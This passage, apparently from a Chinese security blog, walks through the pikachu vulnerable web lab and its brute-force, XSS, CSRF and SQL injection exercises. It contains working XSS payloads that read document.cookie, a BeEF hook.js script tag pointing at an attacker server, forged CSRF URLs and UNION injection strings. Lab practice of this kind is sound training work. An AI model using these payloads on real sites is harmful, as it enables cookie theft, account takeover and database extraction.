<h5 id="simple-xml"><a href="#simple-xml" class="headerlink" title="simple.xml"></a>simple.xml</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;simple.dtd&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>TO<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>FROM<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>HEADING<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        %company;</span><br><span class="line">        <span class="symbol">&amp;aa;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="simple-dtd"><a href="#simple-dtd" class="headerlink" title="simple.dtd"></a>simple.dtd</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class="line">&lt;!ENTITY % company &#x27;charmersix&#x27;&gt;</span><br><span class="line">&lt;!ENTITY aa &quot;2020~2022 %compy; 版权所有&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>效果：<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211082216078.png" alt="image-20221108215139462"></p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>SSRF</tag>
        <tag>JWT</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu靶场</title>
    <url>/2022/08/28/pikachu%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h3 id="靶场安装"><a href="#靶场安装" class="headerlink" title="靶场安装"></a>靶场安装</h3><p>我这里直接本地PHP_study安装了</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060136199.png" alt="image-20221106013553118"></p>
<p>这里没什么好说的，第一步就是去配置文件里改一下数据库相关配置<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060137386.png" alt="image-20221106013736326"></p>
<p>然后点击<code>安装/初始化</code></p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><blockquote>
<p>Burte Force（暴力破解）概述</p>
<p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。</p>
<p>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：</p>
<p>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。<br>千万不要小看暴力破解漏洞,往往这种简单粗暴的攻击方式带来的效果是超出预期的!</p>
<p>你可以通过“BurteForce”对应的测试栏目，来进一步的了解该漏洞。</p>
<p>从来没有哪个时代的黑客像今天一样热衷于猜解密码 —奥斯特洛夫斯基</p>
</blockquote>
<h4 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h4><p>我们抓包,发到<code>intruder</code>,这里我们选择集束炸弹,加进去俩字典,筛选一下长度,然后就发现登陆成功<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060149924.png" alt="image-20221106014949882"></p>
<h4 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h4><p>这里我们抓包会发现,验证码是cookie验证,也就是说可以伪造,甚至是同一个验证码可以一直使用,我们就从一个验证码入手爆破<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211060205025.png" alt="image-20221106020526981"></p>
<h4 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h4><p>先随便填一下看看，发现是js弹窗阻止了你前进的脚步，怎么办呢？</p>
<p>浏览器有js，bp可没有啊，直接爆破<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072056669.png" alt="image-20221107205605619"></p>
<h4 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h4><p>经过不断的重发后我们会发现这个token是每请求一次就会随之改变，那么有没有方式捕获到呢</p>
<p>这个题我们要灵活使用bp进行爆破</p>
<p>我们发到intruder之后，攻击方式选择pitchfork，然后要进入到选项里</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072307777.png" alt="image-20221107230708710"></p>
<p>grep - extract 勾选，always勾选<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072309789.png" alt="image-20221107230906757"></p>
<p>然后添加，这里我比较喜欢用正则，因为只要选中就会自动生成</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072308464.png" alt="image-20221107230823421"></p>
<p>资源池里一定要有一个单线程的<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072309616.png" alt="image-20221107230947585"></p>
<p>给密码payload选好字典后，将token的payload改为递归，并且手动输入刚才请求到的第一个token</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211072304927.png" alt="image-20221107230425825"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><blockquote>
<p>XSS（跨站脚本）概述</p>
<p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>  1.反射性XSS;<br>  2.存储型XSS;<br>  3.DOM型XSS;</p>
<p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。<br>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br> 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br> 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p>
<p>你可以通过“Cross-Site Scripting”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211091928263.png" alt="image-20221109192831155"></p>
<p>长度被限制了，看一下源码<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211091929336.png" alt="image-20221109192945295"></p>
<p>原来20，直接加个0,似乎是没有任何过滤,直接弹就行.</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132134481.png" alt="image-20221113152746088"></p>
<h4 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h4><p>这题给了我们一个登录账号密码<code>admin\123456</code>,登录进去以后是一个框,这里好像还是没有任何过滤,但是我们用admin账号登陆了,就可以尝试一下xss拿admin的cookie,这里介绍除了官方平台给的另外两种方法,第一种很简单,用一下多彩互联网上的xss平台,不用自己搭建甚至是不用自己写一些js语句,就会自动钓信息 <a href="http://xsscom.com/">http://xsscom.com/</a> 这个平平台很简单,xss语句都给你写好了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132134321.png" alt="image-20221113155446190"></p>
<p> 另一种就是在自己的云服务器上写一些php代码就可以详情可以参考这篇<a href="https://charmersix.icu/2022/05/14/ctfshow_xss_wp/">https://charmersix.icu/2022/05/14/ctfshow_xss_wp/</a></p>
<h4 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h4><p>存储型和反射型的区别这里不再赘述，但是payload还是一样的</p>
<h4 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h4><p>打一下我们的经典payload测试一看,过滤写到前端了,太好了,将注释闭合一下就可以了.<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132158608.png" alt="image-20221113215810583"></p>
<p>经测试’可以打断我们””的闭合,所以payload<code>&#39;1&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;</code></p>
<h4 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h4><p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132233596.png" alt="image-20221113223349495"></p>
<p>上一题的payload还是可以用的，只是我们要再点一下<code>就让往事都随风,都随风吧</code></p>
<h4 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h4><p>没有任何回显,源码里也看不见任何东西,我们dirsearch扫一下看看<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211132336684.png" alt="image-20221113233631433"></p>
<p>拿到一个目录,众所周知pikachu的账号密码是<code>admin/123456</code>当然你也可以装作不知道,再去爆破一下登录后台</p>
<p>一登录后台我们就可以看到自己在留言板打的xss已经执行了,payload还是原来的经典,这时候就可以钓到admin的cookie了</p>
<h4 id="xss之过滤"><a href="#xss之过滤" class="headerlink" title="xss之过滤"></a>xss之过滤</h4><p>打上我们那串经典的payload,很明显没有执行,那就换一套连招</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142113870.png" alt="image-20221114211351802"></p>
<p><code>&lt;img src=&#39;x&#39; onerror=&#39;alert(document.cookie)&#39;&gt;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142116233.png" alt="image-20221114211602170"></p>
<p>执行成功</p>
<h4 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h4><p>人生之所有苦短,是因为你的xss学习的还不够好</p>
<p>这题也是点击才能弹窗的xss,onerror函数已经不能用了,这时可以用onclick<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142133066.png" alt="image-20221114213322996"></p>
<h4 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h4><p>这里看了别人的payload,使用了一个JavaScript协议payload:<code>javascript:alert(1)</code>,然后又参考了这位大佬的<a href="https://www.cnblogs.com/ayuuuuuu/p/13362571.html">JavaScript协议</a><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142357729.png" alt="image-20221114235724665"></p>
<h4 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h4><p>先来经典payload看一下<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211150002652.png" alt="image-20221115000226614"></p>
<p>看一下源码会发现输入的东西进入了<code>&lt;script&gt;</code>标签,那我们直接alert就好了,先将’闭合然后把后边的注释一下<code>&#39;;alert(document.cookie)//</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211150005336.png" alt="image-20221115000514267"></p>
<h4 id="前置芝士"><a href="#前置芝士" class="headerlink" title="前置芝士"></a>前置芝士</h4><h5 id="JavaScript协议"><a href="#JavaScript协议" class="headerlink" title="JavaScript协议"></a>JavaScript协议</h5><h6 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h6><p><code>JavaScript</code>通信协议是一个伪协议,用于指定url为JavaScript代码</p>
<ul>
<li><p>语法</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:someScript</span><br></pre></td></tr></table></figure>

<p><code>someScript</code>是一个或多个使用<code>;</code>分割的JavaScript语句.</p>
</li>
<li><p>实例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javasript:alert(document.cookie)&quot;</span>&gt;</span>JavaScript link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h6><ul>
<li><p>返回值会替换当前文档</p>
<p>对于chrome浏览器来说,如果最后一条JavaScript语句的值为字符串(使用’’,””或`括起来的值),那么该字符串会替换当前文档的内容,作为新文档显示出来</p>
<p>对于Firefox浏览器来说,如果最后一条浏览器的返回值不是<code>undefined</code>,那么就调用该返回值的<code>toString()</code>方法(如果toString()方法不存在就调用<code>valueOf()</code>方法)得到的结果作为新文档显示出来</p>
<p>返回值为<code>undefined</code>的几种常见写法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javascript:;</span><br><span class="line">javascript:undefined; <span class="comment">//全局变量undefined的值可能被更改</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//void 将之后的内容当作表达式，然后对该表达式求值，并始终返回undefined，而不管全局变量 undefined 的值是否被改变</span></span><br><span class="line"><span class="comment">// 以下写法等价</span></span><br><span class="line">javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br><span class="line">javascript:<span class="keyword">void</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<h6 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h6><ul>
<li><p>任何使用url的地方都可以使用该通信协议</p>
<p>在保留锚元素<code>href</code>属性的同时防止点击锚元素页内/外跳转</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javascript:;</span><br><span class="line">javascript:undefined;</span><br><span class="line">javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>当作 bookmarklet <a href="https://www.cnblogs.com/ayuuuuuu/p/13368750.html">这里写了个小 Demo</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改书签的 URL 为以下代码, 就可实现分屏功能</span></span><br><span class="line">javascript:<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;&#x27;</span>+document.title+<span class="string">&#x27;&lt;/title&gt;&lt;/head&gt;&lt;body style=&quot;margin:0;&quot;&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;</span>+location.href+<span class="string">&#x27;&gt;&lt;/iframe&gt;&lt;iframe style=&quot;border:none;&quot; width=&quot;50%&quot; height=&quot;100%&quot; src=&#x27;</span>+location.href+<span class="string">&#x27;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>执行 JavaScript 代码 (可以执行xss)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 更改页面背景为绿色 (推荐为锚元素绑定事件来更改页面背景)</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:void(document.body.style.backgroundColor=&#x27;green&#x27;);&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开新页面 (注意需返回 undefined, 否则在火狐浏览器会替换文档)</span></span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:window.open(&#x27;about:blank&#x27;); void(0);&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="beef"><a href="#beef" class="headerlink" title="beef"></a>beef</h5><h6 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h6><p>这里推荐一个比较好用的xss平台：beef, 这个可以搭在自己的vps上,我也是在自己服务器上起了个docker,这里简单放一下安装步骤</p>
<p>首先没有docker的要先安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>

<p>然后我们search一下</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker search beef</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142319109.png" alt="image-20221114231919013"></p>
<p>然后我们pull这个janes的</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker pull docker.io/janes/beef</span><br></pre></td></tr></table></figure>

<p>然后就可以run一下跑起来</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> --<span class="built_in">rm</span> -p 3000:3000 docker.io/janes/beef</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211142321556.png" alt="image-20221114232128531"></p>
<p>这里是没有任何回显的,但是已经跑起来了.不用怀疑,然后我们访问一下<code>http://your_ip:3000/ui/panel</code>登录一下,账号密码都是beef</p>
<h6 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h6><p>beef官方文档说了一堆p话,我是没看懂,这里抄一下这位<a href="https://blog.csdn.net/weixin_44940180/article/details/107549067">大佬的</a></p>
<blockquote>
<p>beef主要是往网页中插入一段名为hook.js的JavaScript脚本代码,如果浏览器访问有了hook.js(钩子)的页面,就会被hook(钩住),勾连的浏览器会执行初始代码返回一些信息,接着目标主机会每隔一段时间(默认为1s)就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行</p>
<p>beef服务器本质上就像一个web应用,被分为前后端.前端会轮询后端是否有新的数据需要更新,同时前端也可以向后端发送指示,beef持有者可以通过浏览器来登录beef的后端,来控制前端(用户的浏览器)</p>
<p>beef一般和xss漏洞结合使用,使目标主机执行带有js的文件,但只能控制一个页面</p>
</blockquote>
<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>经典payload<code>&lt; script src=“http://your_ip/hook.js”&gt;&lt; /script &gt;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211162329317.png" alt="image-20221116232957243"></p>
<p>这里有很多比较好玩的功能可以玩一玩这里还是参考那位大佬的</p>
<blockquote>
<p><strong>模块命令的使用和模块的作用种类</strong><br>Broser：主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。<br>Chrome extensions：主要是针对谷歌浏览器扩展插件<br>Debug：调试功能<br>Exploits：漏洞利用，主要利用一些已公开的漏洞进行攻击测试<br>Host：针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等<br>IPEC：协议间通信。主要是用来连接、控制受害者浏览器的<br>Metasploit：Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试<br>Misc：杂项。<br>Network：网络扫描<br>Persistence：维护受害者访问<br>Phonegap：手机测试<br>Social engineering：社会工程学攻击</p>
<p>其中：<br>绿色模块：可以执行且目标不可见<br>红色模块：不适合当前目标<br>橙色模块：可以执行但目标可见<br>灰色模块：未在目标浏览器上测试过</p>
</blockquote>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><blockquote>
<p>CSRF(跨站请求伪造)概述</p>
<p>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。<br>这里列举一个场景解释一下，希望能够帮助你理解。<br><strong>场景需求：</strong><br>小黑想要修改大白在购物网站tianxie<a href="http://www.xx.com上填写的会员地址./">www.xx.com上填写的会员地址。</a><br><strong>先看下大白是如何修改自己的密码的：</strong><br>登录—修改会员信息，提交请求—修改成功。<br>所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。</p>
<p>但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？<br>于是他自己跑到<a href="http://www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：">www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：</a><br>【<a href="http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change%E3%80%91">http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】</a><br>于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。</p>
<p><strong>为啥小黑的操作能够实现呢。有如下几个关键点：</strong><br>1.<a href="http://www.xxx.com这个网站在用户修改个人的信息时没有过多的校验,导致这个请求容易被伪造/">www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造</a>;<br>—因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。<br>2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;<br>—如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。<br>—因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。<br>当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。<br>—所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
<p>因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：<br>–对敏感信息的操作增加安全的token；<br>–对敏感信息的操作增加安全的验证码；<br>–对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。</p>
<p>如果你没有读太明白,不要犹豫,请再读一遍啦</p>
<p>你可以通过“Cross-site request forgery”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h4><p>比较简单,bp能完全解决,都不用自己写poc,burpsuite直接一键生成</p>
<p>当然,get请求的甚至都不需要bp生成poc,直接改url即可,这里两种方法都说一下吧</p>
<p>首先我们来抓个包,可以发现get传修改的参数,url里就是所修改的信息,我们copy一下,把内容改成我们想要的</p>
<p>比方说这里我构造的是这个<code>http://localhost/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=110&amp;add=nba+lakes&amp;email=110%40pikachu.com&amp;submit=submit</code></p>
<p>然后我们把这个url发给好友kobe,并欺骗他访问一下</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152018424.png" alt="image-20221115201812306"></p>
<p>可以看到,他的信息就被修改了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152023892.png" alt="image-20221115202319851"></p>
<p>第二种还是抓包然后通过bp生成csrf_poc</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152025155.png" alt="image-20221115202504097"></p>
<p>这里呢右上角可以勾选自动提交的,就是kobe一访问就会自动提交表单修改他的信息<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152026009.png" alt="image-20221115202629955"></p>
<p>然后直接点浏览器测试,就会生成一个地址,这个地址就很有隐蔽性比如我这里是<code>http://burpsuite/show/2/hd7yrgsw6qmo867vq7h667rlct97o7sh</code></p>
<p>只要kobe访问它,他就又会被攻击了<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152030068.png" alt="image-20221115203017027"></p>
<p>声明一下:这里是喜欢kobe才会用他的id,并不是想去攻击kobe,我想pikachu的作者应该也是喜欢kobe</p>
<h4 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h4><p>这里很明显上述第一种方法是没法用的,但是第二种方法还是可以的,我们再重复一下上述操作很快就可以实现<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211152343401.png" alt="image-20221115234320367"></p>
<h4 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h4><p>这题并没有找到利用方法,我们去翻一下它的源代码<img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211161958098.png" alt="image-20221116195827914"></p>
<p>就是说我们在访问这个页面的时候就会自动生成一个新的token,那我们看一下这个token有什么规律呢</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成一个token,以当前微妙时间+一个5位的前缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">    &#125; <span class="comment">//释放一个token并且生成一个</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">mt_rand</span>(<span class="number">10000</span>,<span class="number">99999</span>),<span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//uniqid生成一个唯一ID  逗号后的true是more_entropy如果设置为TRUE，uniqid() 会在返回的字符串结尾增加额外的熵（使用combined linear congruential generator）。使得唯一ID更具唯一性。</span></span><br><span class="line"><span class="comment">//mt_rand 随机数生成</span></span><br></pre></td></tr></table></figure>

<p>很明显这个token生成的没有任何规律,一直都在强调一个random</p>
<p>这题token写的很不错,我没有找到可以利用的方法,在网上看了很多大佬的wp,大部分是解释说这个token可以防止csrf,也有大佬说是这个token可以像上边<code>token防爆破?</code>那题一样去爆破token,但是仔细想一下我们怎么才能提前猜到被攻击者的token,我们所进行的爆破都是攻击者主动去爆破的,我们不能让受害者去主动爆破token,但是受害者不爆破token,我们又猜不到他的token,所以只能放弃.我想唯一的方法大概就是给受害者发一个爆破token的脚本让他执行,那我们为什么不直接留后门🤣</p>
<h3 id="Sql-Inject-SQL注入"><a href="#Sql-Inject-SQL注入" class="headerlink" title="Sql Inject(SQL注入)"></a>Sql Inject(SQL注入)</h3><blockquote>
<p>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。<br><strong>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！</strong><br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
<p>SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。<br>你可以通过“Sql Inject”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h4 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h4><p>post型,抓一下包,直接开打,两个回显位</p>
<p><code>1%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171858597.png" alt="image-20221117185821480"></p>
<p>然后继续打<code>1%20union%20select%201%2C(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D&#39;users&#39;)%20limit%201%2C1</code><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202211171909147.png" alt="image-20221117190925083"></p>
